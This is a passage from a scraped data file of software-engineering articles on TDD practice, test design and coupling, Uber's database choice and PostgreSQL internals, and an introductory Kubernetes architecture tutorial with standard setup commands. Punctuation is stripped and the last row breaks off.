concluded that writing tests first is more effective than adding tests later  How much more effective  40 80  fewer bugs in production more effective   If you think you re doing OK charging in with the implementation before you write the test  I m here to tell you  statistically speaking  you re giving yourself a major handicap  TDD requires discipline that takes some time to learn   Developers who have not developed the test first TDD discipline often charge into the implementation of the code before they know what the API will look like   They start implementing code before they have even designed a function signature   This is the opposite of TDD  The point of TDD is that it forces you to have a direction in mind before you start charging into the fray  and having a direction in mind leads to better designs   Before I even write my first test  I create an RDD doc  RDD stands for Readme Driven Development   I don t try to flesh out the entire design of the system in RDD form before I start working on the code  but I do decide  I m building a module that does x  and it needs a function signature that takes y and returns z   In other words  I make an RDD doc that contains dream code with examples of how a unit s API will be used  The same kinds of examples you ll see in software library  Getting Started  and API guides   For many of my test cases  I simply copy and paste examples from the RDD  which gives me a starting point for simple tests   For example  a dream code RDD for a number range generator might look like this   This gives me actual and expected values I can copy and paste right into my unit tests  The first usage above could be repurposed in the following test  and so on   For more on how to write tests like this  see  Five Questions Every Unit Test Must Answer    3  You Have to Write All Tests Before You Start the Code  The reason it s so hard for developers to imagine TDD working is because software design is an iterative  discovery driven process  So is building a skyscraper  by the way  Contrary to common belief  architects don t design the complete skyscraper before any work begins  Crews have to go out and survey the landscape  They have to inspect the ground where the foundation will be built  They have to ensure that the ground can support the weight of the skyscraper  They have to probe beneath the ground to discover whether or not there is a cave system that might collapse  whether there are water problems that need to be worked out and so on   100  design up front is a myth in every type of engineering  Design is exploratory  We try things out  throw them away  try different things until we reach something that we like  Now true  if you wrote every test up front before you wrote a line of implementation code  that would hinder the exploration process  but that s not how successful TDD works  Instead   Write one test Watch it fail Implement the code Watch the test pass Repeat  4  Red  Green  and ALWAYS Refactor   A common response to the instruction list above is  you forgot refactor    No  I didn t  One of the great benefits of TDD is that it can help you refactor when you need to  but I m gonna level with you  Unless your code is horrendously unreadable  or you ve benchmarked it and discovered it s too slow  you probably don t need to refactor    Perfect is the enemy of good     Voltaire  Sure  look over your code and see if there are opportunities to make it better  but don t refactor just for the sake of refactoring  Time is wasting  Move on to the next test   5  Everything Needs Unit Tests  Unit tests work best for pure functions   functions which   Given the same input  always return the same output Have no side effects  don t mutate shared state  save data  talk to the network  draw things to screen  log to the console  etc    Unit tests aren t exclusively for pure functions  but the less your code relies on any shared state or I O dependencies  the easier it will be to test  Lots of your code won t be easy to unit test  Lots of your code will talk to the network  query a database  draw to the screen  capture user input  and so on  The code responsible for all of that is impure  and as such  it s a lot harder to test with unit tests   People end up mocking database drivers  network I O  user I O  and all kinds of other things in an effort to follow the rule that your units need to be tested in isolation   Here s a tip that will change your life   Mocking is a code smell   If you have to do a lot of mocking to create a proper unit test  maybe that code doesn t need unit tests at all   Maybe a functional test would be a better fit  Trying to use unit tests for I O dependent code will cause problems  and I estimate that those who complain that test first is hard are falling into that trap   Your code should be modular enough that it s easy to keep I O dependent modules at the edges of your program  leaving huge parts of the app that can be easily unit tested  but if you feel like you re forcing modularity just for the sake of testing  and not because it actually makes your app architecture better  you should rethink your testing strategy   That said  if you re tempted to do all your testing with functional e2e tests  that s problematic  too   You re going to end up with   Inadequate test coverage which doesn t properly exercise the modular units of your code  and  A tightly coupled monolith which becomes harder to maintain over time   Very small projects can get away with both  but really successful projects tend to grow out of that phase  and would benefit from more modular architecture  and better testing discipline   Healthy test suites will recognize that there are three major types of software tests that all play a role  and your test coverage will create a balance between them,"[1235 1252 150 300 1029 800 683 206 778 550 61]"
1246,training-dataset/business/263.txt,business,7 weeks of Awesome TechstarsWith the Techstars application deadline fast approaching in Boulder  Techstars is hosting a series called 7 weeks of awesome highlighting some of the amazing experiences you will get if you become part of the Techstars program   This talk features Jason Mendelson from the Foundry Group talking about the 10 no wait 12  hold on 18 things you can do to totally  Screw  your company   techstars com 8 weeks of awesome gearing up for techstars in boulder,"[1246 541 60 525 1373 370 778 1335 830 112 61]"
1252,training-dataset/engineering/1409.txt,engineering,Clean Coder BlogThe idea that TDD damages design and architecture is not new  DHH suggested as much several years ago with his notion of Test Induced Design Damage  in which he compares the design he prefers to a design created by Jim Weirich that is  testable   The argument  boils down to separation and indirection  DHH s concept of good design minimizes these attributes  whereas Weirich s maximizes them   I strongly urge you to read DHH s article  and watch Weirich s video  and judge for yourself which design you prefer   Recently I ve seen the argument resurface on twitter  though not in reference to DHH s ideas  but instead in reference to a very old interview between James Coplien and myself  In this case the argument is about using TDD to allow architecture to emerge  As you ll discover  if you read through that interview  Cope and I agree that architecture does not emerge from TDD  The term I used  in that interview was  I believe   Horse shit   Still another common argument is that as the number of tests grows  a single change to the production code can cause hundreds of tests to require corresponding changes  For example  if you add an argument to a method  every test that calls that method must be changed to add the new argument  This is known as The Fragile Test Problem   A related argument is  The more tests you have  the harder it is to change the production code  because so many tests can break and require repair  Thus  tests make the production code rigid   What s behind this   Is there anything to these concerns  Are they real  Does TDD really damage design and architecture   There are too many issues to simply disregard  So what s going on here   Before I answer that  let s look at a simple diagram  Which of these two designs is better   Yes  it s true  I ve given you a hint by coloring the left  sinister  side red  and the right  dexter  side green  I hope it is clear that the right hand solution is generally better than the left   Why  Coupling  of course  In the left solution the users are directly coupled to a multitude of services  Any change to a service  regardless of how trivial  will likely cause many users to require change  So the left side is fragile   Worse  the left side users act as anchors that impede the ability of the developers to make changes to the services  Developers fear that too many users may be affected by simple changes  So the left side is rigid   The right side  on the other hand  decouples the users from the services by using an API  What s more  the services implement the API using inheritance  or some other form of polymorphism   That is the meaning of the closed triangular arrows   a UMLism   Thus a large number of changes can be made to the services without affecting either the API or the users  What s more the users are not an anchor making the services rigid   The principles at play here are the Open Closed Principle  OCP  and the Dependency Inversion Principle  DIP    Note  that the design on the left is the design that DHH was advocating in his article  whereas the design on the right was the topic of Weirich s exploration  DHH likes the directness of the design on the left  Weirich likes the separation and isolation of the design on the right   The Critical Substitution  Now  in your mind  I want you to make a simple substitution  Look at that diagram  and substitute the word  TEST  for the word  USER    and then think   Yes  That s right  Tests need to be designed  Principles of design apply to tests just as much as they apply to regular code  Tests are part of the system  and they must be maintained to the same standards as any other part of the system   One to One Correspondence   If you ve been following me for any length of time you know that I describe TDD using three laws  These laws force you to write your tests and your production code simultaneously  virtually line by line  One line of test  followed by one line of production code  around  and around and around  If you ve never seen or experienced this  you might want to watch this video   Most people who are new to TDD  and the three laws  end up writing tests that look like the diagram on the left  They create a kind of one to one correspondence between the production code and the test code  For example  they may create a test class for every production code class  They may create test methods for every production code method   Of course this makes sense  at first  After all  the goal of any test suite is to test the elements of the system  Why wouldn t you create tests that had a one to one correspondence with those elements  Why wouldn t you create a test class for each class  and a set of test methods for each method  Wouldn t that be the correct solution   And  indeed  most of the books  articles  and demonstrations of TDD show precisely that approach  They show tests that have a strong structural correlation to the system being tested  So  of course  developers trying to adopt TDD will follow that advice   The problem is   and I want you to think carefully about this next statement   a one to one correspondence implies extremely tight coupling   Think of it  If the structure of the tests follows the structure of the production code  then the tests are inextricably coupled to the production code   and they follow the sinister red picture on the left   FitNesse  It  frankly  took me many years to realize this  If you look at the structure of FitNesse  which we began writing in 2001  you will see a strong one to one correspondence between the test classes and the production code classes  Indeed  I used to tout this as an advantage because I could find every unit test by simply putting the word  Test  after the class that was being tested   And  of course  we experienced some of the problems that you would expect with such a sinister design  We had fragile tests  We had structures made rigid by the tests  We felt the pain of TDD  And  after several years  we started to understand that the cause of that pain was that we were not designing our tests to be decoupled   If you look at part of FitNesse written after 2008 or so  you ll see that there is a significant drop in the one to one correspondence  The tests and code look more like the green design on the right   Emergence   The idea that the high level design and architecture of a system emerge from TDD is  frankly  absurd  Before you begin to code any software project  you need to have some architectural vision in place  TDD will not  and can not  provide this vision  That is not TDD s role   However  this does not mean that designs do not emerge from TDD   they do  just not at the highest levels  The designs that emerge from TDD are one or two steps above the code  and they are intimately connected to the code  and to the red green refactor cycle   It works like this  As some programmers begin to develop a new class or module  they start by writing simple tests that describe the most degenerate behaviors  These tests check the absurdities  such as what the system does when no input is provided  The production code that solves these tests is trivial  and gradually grows as more and more tests are added   At some point  relatively early in the process  the programmers look at the production code and decide that the structure is a bit messy  So the programmers extract a few methods  rename a few others  and generally clean things up  This activity will have little or no effect on the tests  The tests are still testing all that code  regardless of the fact that the structure of that code is changing   This process continues  As tests of ever greater complexity and constraint are added to the suite  the production code continues to grow in response  From time to time  relatively frequently  the programmers clean that production code up  They may extract new classes  They may even pull out new modules  And yet the tests remain unchanged  The tests still cover the production code  but they no longer have a similar structure   And so  to bridge the different structure between the tests and the production code  an API emerges  This API serves to allow the two streams of code to evolve in very different directions  responding to the opposing forces that press upon tests and production code   Forces in Opposition  I said  above  that the tests remain unchanged during the process  This isn t actually true  The tests are also refactored by the programmers on a fairly frequent basis  But the direction of the refactoring is very different from the direction that the production code is refactored  The difference can be summarized by this simple statement   As the tests get more specific  the production code gets more generic   This is  to me  one of the most important revelations about TDD in the last 16 years  These two streams of code evolve in opposite directions  Programmers refactor tests to become more and more concrete and specific  They refactor the production code to become more and more abstract and general   Indeed  this is why TDD works  This is why designs can emerge from TDD  This is why algorithms can be derived by TDD  These things happen as a direct result of programmers pushing the tests and production code in opposite directions   Of course designs emerge  if you are using design principles to push the production code to be more and more generic  Of course APIs emerge if you are pulling these two streams of communicating code towards opposite extremes of specificity and generality  Of course algorithms can be derived if the tests grow ever more constraining while the production code grows ever more general   And  of course  highly specific code cannot have a one to one correspondence with highly generic code   Conclusion  What makes TDD work  You do  Following the three laws provides no guarantee  The three laws are a discipline  not a solution  It is you  the programmer  who makes TDD work  And you make it work by understanding that tests are part of the system  that tests must be designed  and that test code evolves towards ever greater specificity  while production code evolves towards ever greater generality   Can TDD harm your design and architecture  Yes  If you don t employ design principles to evolve your production code  if you don t evolve the tests and code in opposite directions  if you don t treat the tests as part of your system  if you don t think about decoupling  separation and isolation  you will damage your design and architecture   TDD or no TDD   You see  it is not TDD that creates bad designs  It is not TDD that creates good designs  It s you  TDD is a discipline  It s a way to organize your work  It s a way to ensure test coverage  It is a way to ensure appropriate generality in response to specificity   TDD is important  TDD works  TDD is a professional discipline that all programmers should learn and practice  But it is not TDD that causes good or bad designs  You do that   Is is only programmers  not TDD  that can do harm to designs and architectures,"[1252 1235 1029 800 150 300 683 206 1225 550 656]"
1295,training-dataset/engineering/501.txt,engineering,On Uber s Choice of DatabasesA few days ago Uber published the article  Why Uber Engineering Switched from Postgres to MySQL   I didn t read the article right away because my inner nerd told me to do some home improvements instead  While doing so my mailbox was filling up with questions like  Is PostgreSQL really that lousy    Knowing that PostgreSQL is not generally lousy  these messages made me wonder what the heck is written in this article  This post is an attempt to make sense out of Uber s article   In my opinion Uber s article basically says that they found MySQL to be a better fit for their environment as PostgreSQL  However  the article does a lousy job to transport this message  Instead of writing  PostgreSQL has some limitations for update heavy use cases  the article just says  Inefficient architecture for writes   for example  In case you don t have an update heavy use case  don t worry about the problems described in Uber s article   In this post I ll explain why I think Uber s article must not be taken as general advice about the choice of databases  why MySQL might still be a good fit for Uber  and why success might cause more problems than just scaling the data store   On UPDATE  The first problem Uber s article describes in great  yet incomplete detail is that PostgreSQL always needs to update all indexes on a table when updating rows in the table  MySQL with InnoDB  on the other hand  needs to update only those indexes that contain updated columns  The PostgreSQL approach causes more disk IOs for updates that change non indexed columns   Write Amplification  in the article   If this is such a big problem to Uber  these updates might be a big part of their overall workload   However  there is a little bit more speculation possible based upon something that is not written in Uber s article  The article doesn t mention PostgreSQL Heap Only Tuples  HOT   From the PostgreSQL source  HOT is useful for the special case  where a tuple is repeatedly updated in ways that do not change its indexed columns   In that case  PostgreSQL is able to do the update without touching any index if the new row version can be stored in the same page as the previous version  The latter condition can be tuned using the fillfactor setting  Assuming Uber s Engineering is aware of this means that HOT is no solution to their problem because the updates they run at high frequency affect at least one indexed column   This assumption is also backed by the following sentence in the article   if we have a table with a dozen indexes defined on it  an update to a field that is only covered by a single index must be propagated into all 12 indexes to reflect the ctid for the new row   It explicitly says  only covered by a single index  which is the edge case just one index otherwise PostgreSQL s HOT would solve the problem    Side note  I m genuinely curious whether the number of indexes they have could be reduced index redesign in my challenge  However  it is perfectly possible that those indexes are used sparingly  yet important when they are used    It seems that they are running many updates that change at least one indexed column  but still relatively few indexed columns compared to the  dozen  indexes the table has  If this is a predominate use case  the article s argument to use MySQL over PostgreSQL makes sense   On SELECT  There is one more statement about their use case that caught my attention  the article explains that MySQL InnoDB uses clustered indexes and also admits that  This design means that InnoDB is at a slight disadvantage to Postgres when doing a secondary key lookup  since two indexes must be searched with InnoDB compared to just one for Postgres   I ve previously written about this problem   the clustered index penalty   in context of SQL Server   What caught my attention is that they describe the clustered index penalty as a  slight disadvantage   In my opinion  it is a pretty big disadvantage if you run many queries that use secondary indexes  If it is only a slight disadvantage to them  it might suggest that those indexes are used rather seldom  That would mean  they are mostly searching by primary key  then there is no clustered index penalty to pay   Note that I wrote  searching  rather than  selecting   The reason is that the clustered index penalty affects any statement that has a where clause not just select  That also implies that the high frequency updates are mostly based on the primary key   Finally there is another omission that tells me something about their queries  they don t mention PostgreSQL s limited ability to do index only scans  Especially in an update heavy database  the PostgreSQL implementation of index only scans is pretty much useless  I d even say this is the single issue that affects most of my clients  I ve already blogged about this in 2011  In 2012  PostgreSQL 9 2 got limited support of index only scans  works only for mostly static data   In 2014 I even raised one aspect of my concern at PgCon  However  Uber doesn t complain about that  Select speed is not their problem  I guess query speed is generally solved by running the selects on the replicas  see below  and possibly limited by mostly doing primary key side   By now  their use case seems to be a better fit for a key value store  And guess what  InnoDB is a pretty solid and popular key value store  There are even packages that bundle InnoDB with some  very limited  SQL front ends  MySQL and MariaDB are the most popular ones  I think  Excuse the sarcasm  But seriously  if you basically need a key value store and occasionally want to run a simple SQL query  MySQL  or MariaDB  is a reasonable choice  I guess it is at least a better choice than any random NoSQL key value store that just started offering an even more limited SQL ish query language  Uber  on the other hand just builds their own thing   Schemaless   on top of InnoDB and MySQL   On Index Rebalancing  One last note about how the article describes indexing  it uses the word  rebalancing  in context of B tree indexes  It even links to a Wikipedia article on  Rebalancing after deletion   Unfortunately  the Wikipedia article doesn t generally apply to database indexes because the algorithm described on Wikipedia maintains the requirement that each node has to be at least half full  To improve concurrency  PostgreSQL uses the Lehman  Yao variation of B trees  which lifts this requirement and thus allows sparse indexes  As a side note  PostgreSQL still removes empty pages from the index  see slide 15 of  Indexing Internals    However  this is really just a side issue   What really worries me is this sentence   An essential aspect of B trees are that they must be periodically rebalanced     Here I d like to clarify that this is not a periodic process one that runs every day  The index balance is maintained with every single index change  even worse  hmm    But the article continues   and these rebalancing operations can completely change the structure of the tree as sub trees are moved to new on disk locations   If you now think that the  rebalancing  involves a lot of data moving  you misunderstood it   The important operation in a B tree is the node split  As you might guess  a node split takes place when a node cannot host a new entry that belongs into this node  To give you a ballpark figure  this might happen once for about 100 inserts  The node split allocates a new node  moves half of the entries to the new node and connects the new node to the previous  next and parent nodes  This is where Lehman  Yao save a lot of locking  In some cases  the new node cannot be added to the parent node straight away because the parent node doesn t have enough space for the new child entry  In this case  the parent node is split and everything repeats   In the worst case  the splitting bubbles up to the root node  which will then be split as well and a new root node will be put above it  Only in this case  a B tree ever becomes deeper  Note that a root node split effectively shifts the whole tree down and therefore keeps the balance  However  this doesn t involve a lot of data moving  In the worst case  it might touch three nodes on each level and the new root node  To be explicit  most real world indexes have no more than 5 levels  To be even more explicit  the worst case root node split might happen about five times for a billion inserts  On the other cases it will not need to go the whole tree up  After all  index maintenance is not  periodic   not even very frequent  and is never completely changing the structure of the tree  At least not physically on disk   On Physical Replication  That brings me to the next major concern the article raises about PostgreSQL  physical replication  The reason the article even touches the index  rebalancing  topic is that Uber once hit a PostgreSQL replication bug that caused data corruption on the downstream servers  the bug  only affected certain releases of Postgres 9 2 and has been fixed for a long time now     Because PostgreSQL 9 2 only offers physical replication in core  a replication bug  can cause large parts of the tree to become completely invalid   To elaborate  if a node split is replicated incorrectly so that it doesn t point to the right child nodes anymore  this sub tree is invalid  This is absolutely true like any other  if there is a bug  bad things happen  statement  You don t need to change a lot of data to break a tree structure  a single bad pointer is enough   The Uber article mentions other issues with physical replication  huge replication traffic partly due to the write amplification caused by updates and the downtime required to update to new PostgreSQL versions  While the first one makes sense to me  I really cannot comment on the second one  but there were some statements on the PostgreSQL hackers mailing list    Finally  the article also claims that  Postgres does not have true replica MVCC support   Luckily the article links to the PostgreSQL documentation where this problem  and remediations  are explained  The problem is basically that the master doesn t know what the replicas are doing and might thus delete data that is still required on a replica to complete a query   According to the PostgreSQL documentation  there are two ways to cope with this issue   1  delaying the application of the replication stream for a configurable timeout so the read transaction gets a chance to complete  If a query doesn t finish in time  kill the query and continue applying the replication stream   2  configure the replicas to send feedback to the master about the queries they are running so that the master does not vacuum row versions still needed by any slave  Uber s article rules the first option out and doesn t mention the second one at all  Instead the article blames the Uber developers   On Developers  To quote it in all its glory   For instance  say a developer has some code that has to email a receipt to a user  Depending on how it s written  the code may implicitly have a database transaction that s held open until after the email finishes sending  While it s always bad form to let your code hold open database transactions while performing unrelated blocking I O  the reality is that most engineers are not database experts and may not always understand this problem  especially when using an ORM that obscures low level details like open transactions    Unfortunately  I understand and even agree with this argument  Instead of  most engineers are not database experts  I d even say that most developers have very little understanding of databases because every developer that touches SQL needs to know about transactions not just database experts   Giving SQL training to developers is my main business  I do it at companies of all sizes  If there is one thing I can say for sure is that the knowledge about SQL is ridiculously low  In context of the  open transaction  problem just mentioned I can conform that hardly any developer even knows that read only transactions are a real thing  Most developers just know that transactions can be used to back out writes  I ve encountered this misunderstanding often enough that I ve prepared slides to explain it and I just uploaded these slides for the curious reader   On Success  This leads me to the last problem I d like to write about  the more people a company hires  the closer their qualification will be to the average  To exaggerate  if you hire the whole planet  you ll have the exact average  Hiring more people really just increases the sample size   The two ways to beat the odds are   1  Only hire the best  The difficult part with this approach is to wait if no above average candidates are available   2  Hire the average and train them on the job  This needs a pretty long warm up period for the new staff and might also bind existing staff for the training  The problem with both approaches is that they take time  If you don t have time because your business is rapidly growing you have to take the average  which doesn t know a lot about databases  empirical data from 2014   In other words  for a rapidly growing company  technology is easier to change than people   The success factor also affects the technology stack as requirements change over time  At an early stage  start ups need out of the box technology that is immediately available and flexible enough to be used for their business  SQL is a good choice here because it is actually flexible  you can query your data in any way  and it is easy to find people knowing SQL at least a little bit  Great  let s get started  And for many probably most companies  the story ends here  Even if they become moderately successful and their business grows  they might still stay well within the limits of SQL databases forever  Not so for Uber   A few lucky start ups eventually outgrow SQL  By the time that happens  they have access to way more  virtually unlimited   resources and then something wonderful happens  They realize that they can solve many problems if they replace their general purpose database by a system they develop just for their very own use case  This is the moment a new NoSQL database is born  At Uber  they call it Schemaless   On Uber s Choice of Databases  By now  I believe Uber did not replace PostgreSQL by MySQL as their article suggests  It seems that they actually replaced PostgreSQL by their tailor made solution  which happens to be backed by MySQL InnoDB  at the moment    It seems that the article just explains why MySQL InnoDB is a better backend for Schemaless than PostgreSQL  For those of you using Schemaless  take their advice  Unfortunately  the article doesn t make this very clear because it doesn t mention how their requirements changed with the introduction of Schemaless compared to 2013  when they migrated from MySQL to PostgreSQL   Sadly  the only thing that sticks in the reader s mind is that PostgreSQL is lousy   If you like my way of explaining things  you ll love my book,"[1295 424 673 281 1016 1300 778 1086 1409 733 952]"
1297,training-dataset/engineering/922.txt,engineering,Introduction to Kubernetes ArchitectureKubernetes  Containerisation has brought a lot of flexibility for developers in terms of managing the deployment of the applications  However the more granular the application is  the more components it consists of and hence requires some sort of management for those   One still needs to take care of scheduling the deployment of a certain number of containers to a specific node  managing networking between the containers  following the resource allocation  moving them around as they grow and many more   Nearly all applications nowadays need to have answers for things like  Replication of components  Auto scaling  Load balancing  Rolling updates  Logging across components  Monitoring and health checking  Service discovery  Authentication  Google has given a combined solution for that which is Kubernetes  or how it s shortly called   K8s   In this article we will look into the moving parts of Kubernetes   what are the key elements  what are they responsible for and what is the typical usage of them  We will then have them all installed using the docker container provided as a playground by K8s team  and review the components deployed   Glossary  Before we dive into setting up the components  you should get comfortable with some Kubernetes glossary   Pod  Kubernetes targets the management of elastic applications that consist of multiple microservices communicating with each other  Often those microservices are tightly coupled forming a group of containers that would typically  in a non containerized setup run together on one server  This group  the smallest unit that can be scheduled to be deployed through K8s is called a pod   This group of containers would share storage  Linux namespaces  cgroups  IP addresses  These are co located  hence share resources and are always scheduled together   Pods are not intended to live long  They are created  destroyed and re created on demand  based on the state of the server and the service itself   Service  As pods have short lifetime  there is not guarantee about the IP address they are served on  This could make the communication of microservices hard   Imagine a typical Frontend communication with Backend services   Hence K8s has introduced the concept of service  which is an abstraction on top of number of pods  typically requiring to run a proxy on top  for other services to communicate with it via a Virtual IP address   This is where you can configure load balancing for your numerous pods and expose them via a service   Kubernetes components  A K8s setup consist of several parts  some of them optional  some mandatory for the whole system to function   This is a high level diagram of the architecture  Let s have a look into each of the component s responsibilities   Master Node  Master node is responsible for the management of Kubernetes cluster  This is the entry point of all administrative tasks  Master node is the one taking care of orchestrating the worker nodes  where the actual services are running   Diving into each of the components of the master node   API server  API server is the entry points for all the REST commands used to control the cluster  It processes the rest requests  validates them  executes the bound business logic  The result state has to be persisted somewhere  and that brings us to the next component of the master node   etcd storage  etcd is a simple  distributed  consistent key value store  It s mainly used for shared configuration and service discovery   It provides a REST API for CRUD operations as well as an interface to register watchers on specific nodes  which enables a reliable way to notify the rest of the cluster about configuration changes   Example of data stored by Kubernetes in etcd are jobs being scheduled  created and deployed pod service details and state  namespaces and replication informations  etc   scheduler  The deployment of configured pods and services onto the nodes happens thanks to the scheduler component   Scheduler has the information regarding resources available on the members of the cluster  as well as the ones required for the configured service to run and hence is able to decide where to deploy a specific service   controller manager  Optionally you can run different kinds of controllers inside the master node  controller manager is a daemon embedding those   A controller uses apiserver to watch the shared state of the cluster and makes corrective changes to the current state to being it to the desired one   An example of such a controller is the Replication controller   which takes care of the number of pods in the system  The replication factor is configured by the user and that s the controller s responsibility to recreate a failed pod  or remove an extra scheduled one   Other examples of controllers are endpoints controller  namespace controller  and serviceaccounts controller  but we will not dive into details here   Worker node  The pods are run here  so the worker node contains all the necessary services to manage the networking between the containers  communicate with the master node  and assign resources to the containers scheduled   Docker  Docker runs on each of the worker nodes  and runs the configured pods  It takes care of downloading the images and starting the containers   kubelet  kubelet gets the configuration of a pod from the apiserver and ensures that the described containers are up and running  This is the worker service that s responsible for communicating with master ndoe   It also communicates with etcd  to get information about services and write the details about newly created ones   kube proxy  kube proxy acts as a network proxy and a load balancer for a service on a single worker node  It takes care of the network routing for TCP and UDP packets   kubectl  And final bit   a command line tool to communicate with API service and send commands to the master node   Sample setup  The easiest way to start is to run all the described components inside a docker   Kubernetes provides a ready docker instance that would start up other parts of the system and eventually the picture of the setup looks like this  Prerequisites  The only thing you need for this setup is a docker daemon  The rest is taken care of the docker image   Please not this example is for educational purposes  In the normal setup you would have the master and worker s  separated and possibly running behind a firewall   Dockerized deployment  Let s start by retrieving and setting the latest version of Kubernetes as an environmental variable  so that we can use it in later calls   Run this command on the host server  where the docker daemon is running   export K8S_VERSION   curl  sS https   storage googleapis com kubernetes release release stable txt   This will make a request to the kubernetes stable release file and set the environmental variable K8_VERSION to the latest stable release version  We also assume that the host you are running on has the amd64 architecture you can refer to other architectures in this discussion    Exporting the system architecture as a variable on the host server  export ARCH amd64  Next we will run the hypercube docker instance  which will itself take care of downloading and starting the rest of the Kubernetes components   The hypercube container is given special  extended privileges  so that it can access resources of the host  as well as run other containers on the host   That is achieved by  first of all  mapping the  root    sys and  var run of the host to the container directories in the read write mode   Secondly the container is run with the   privileged option which grants access to all devices of the host to the container  and allows starting new containers on the machine  This flag also requires the  var lib docker path to be a volume     net host and   pid host are allowing access to the network and PID namespace of the host basically allowing docker that we are running to see and control processed on the host and reuse the network configurations   So  putting that all together  and specifying the gcr io google_containers hyperkube   ARCH    K8S_VERSION  image as well as the properties of the hypercube  we get to run the following command on the host   docker run  d     volume    rootfs ro     volume  sys  sys rw     volume  var lib docker   var lib docker rw     volume  var lib kubelet   var lib kubelet rw     volume  var run  var run rw     net host     pid host     name hyperkube installer     privileged   gcr io google_containers hyperkube   ARCH    K8S_VERSION     hyperkube kubelet     containerized     hostname override 127 0 0 1     api servers http   localhost 8080     config  etc kubernetes manifests     allow privileged   v 2  The started container  runs the hyperkube binary which itself starts all the components we discussed so far   This might take a moment  so after a while if you run the docker ps command  you should see an output similar to this   docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f267d9d1a24d gcr io google_containers hyperkube amd64 v1 2 4   setup files sh IP 1  About a minute ago Up About a minute k8s_setup eb843218_k8s master 127 0 0 1_default_721118f359852533089009890ac21208_3765dd28 09fc01b04ba6 gcr io google_containers hyperkube amd64 v1 2 4   hyperkube scheduler  About a minute ago Up About a minute k8s_scheduler dbfcc0_k8s master 127 0 0 1_default_721118f359852533089009890ac21208_28c46205 4ac31a50c2bb gcr io google_containers hyperkube amd64 v1 2 4   hyperkube apiserver  About a minute ago Up About a minute k8s_apiserver 1082c1e0_k8s master 127 0 0 1_default_721118f359852533089009890ac21208_d5d50d58 375857e4dec5 gcr io google_containers hyperkube amd64 v1 2 4   hyperkube proxy   m  About a minute ago Up About a minute k8s_kube proxy a1014855_k8s proxy 127 0 0 1_default_0cda4a663a246109121ac68b3c7e82b7_890d5a95 8b19a89a2695 gcr io google_containers etcd 2 2 1   usr local bin etcd   About a minute ago Up About a minute k8s_etcd 7e452b0b_k8s etcd 127 0 0 1_default_1df6a8b4d6e129d5ed8840e370203c11_9e621ad8 3d6c9d9c60cd gcr io google_containers hyperkube amd64 v1 2 4   hyperkube controlle  About a minute ago Up About a minute k8s_controller manager 76914b67_k8s master 127 0 0 1_default_721118f359852533089009890ac21208_cb0abac9 155351af7913 gcr io google_containers pause 2 0   pause  About a minute ago Up About a minute k8s_POD 6059dfa2_k8s master 127 0 0 1_default_721118f359852533089009890ac21208_4365c22c 84b32314d407 gcr io google_containers pause 2 0   pause  About a minute ago Up About a minute k8s_POD 6059dfa2_k8s etcd 127 0 0 1_default_1df6a8b4d6e129d5ed8840e370203c11_1003b43b 5e44113ee806 gcr io google_containers pause 2 0   pause  About a minute ago Up About a minute k8s_POD 6059dfa2_k8s proxy 127 0 0 1_default_0cda4a663a246109121ac68b3c7e82b7_f37316b9 197cd920afc5 gcr io google_containers hyperkube amd64 v1 2 4   hyperkube kubelet    About a minute ago Up About a minute hyperkube installer  Looking at the names of the docker instances  it s not hard to guess what each component stands for   The first container in the list k8s_setup k8s master 127 0 0 1   takes care of setting up the master node  what it does  can be drilled down to creating of    takes care of setting up the master node  what it does  can be drilled down to creating of the basic auth file for access to the Kubernetes api server  service tokens for accessing the Kubernetes api server  The CA cert and keys for HTTPS access to the Kubernetes api server  You can see in the list  containers for each of the components we discussed   k8s_scheduler   k8s_apiserver   k8s_kube proxy   k8s_etcd and k8s_controller manager        and The next 3 pod containers are so call  pause  containers  which are used to setup the networking initially  before launching the real container  And finally the installer container we started to put this all together  Deploying new pod  Now that we have a small Kubernetes setup on our host  we should get the command line tool to deploy our first pod and service   We will use the installer docker container to demonstrate the kubectl in action   Enter the installer container using  docker exec  it hyperkube installer  bin bash  Export the K8S_VERSION variable again  while being inside the installer container  export K8S_VERSION   curl  sS https   storage googleapis com kubernetes release release stable txt   The following command will download the correct version of kubectl and place it inside the  usr bin kubectl  curl  sSL  http   storage googleapis com kubernetes release release  K8S_VERSION bin linux amd64 kubectl     usr bin kubectl  Make it executable  chmod  x  usr bin kubectl  Now you should be able to run a simple kubectl version command and get a similar output  kubectl version Client Version  version Info Major  1   Minor  2   GitVersion  v1 2 4   GitCommit  3eed1e3be6848b877ff80a93da3785d9034d0a4f   GitTreeState  clean   Server Version  version Info Major  1   Minor  2   GitVersion  v1 2 4   GitCommit  3eed1e3be6848b877ff80a93da3785d9034d0a4f   GitTreeState  clean    To list the nodes  kubectl get nodes  NAME STATUS AGE 127 0 0 1 Ready 1d  And finally to deploy a sample nginx as a pod  kubectl run nginx   image nginx   port 80  You can now exit the hyperkube installer container we are in  using CTRL D   and wait a bit for the nginx image to get downloaded  If you run the docker ps command on the host again you would see 2 more containers appearing  docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES b99ae41911d9 nginx  nginx  g  daemon off  31 minutes ago Up 31 minutes k8s_nginx c8c72836_nginx 198147104 sdqet_default_791e301f 358b 11e6 94ba 080027faa9e4_cde648eb efff5259a994 gcr io google_containers pause 2 0   pause  31 minutes ago Up 31 minutes k8s_POD cf58006d_nginx 198147104 sdqet_default_791e301f 358b 11e6 94ba 080027faa9e4_3e7040c5  As you can see 2 containers have been created with our kubectl run command   First one is the actual nginx container created and deployed by Kubernetes  The second one  as explained above  is an infrastructure container   this is the first container that is started for a pod  it set s up the network for the pod  then pauses  All other containers for a specific pod  join the network set up by this container   In order to access the deployed nginx container  we would need to declare it as a service and obtain a concrete IP address that got assigned to it   Login back to our playground container  docker exec  it hyperkube installer  bin bash  The following command exposes the nginx deployment as a service and maps the 80 port of the nginx service to the 8080 port of the host  kubectl expose deployment nginx   port 8080   target port 80  Now  to see the list of services we have we run kubectl get service nginx   The output should be similar to  NAME CLUSTER IP EXTERNAL IP PORT S  AGE nginx 10 0 0 185 8080 TCP 12s  You can see the list of services  with assigned IP address and exposed ports   Let s take the IP address only and set it to a variable to try accessing the nginx   ip   kubectl get svc nginx   template    spec clusterIP     Now that the ip variable is pointing to the correct service  in this case that would be 10 0 0 185    we can run the curl for the default nginx page  curl  http    ip 8080    The output should contain the usual nginx welcome page   Summary  This guide gives you a high level overview on the architecture and moving parts of Kubernetes setup   We deployed a mini kubernetes setup inside a docker container  and deployed our fist pod   In order to get deeper understanding  it is highly encouraged to deploy each of the components separately and setup their communication from 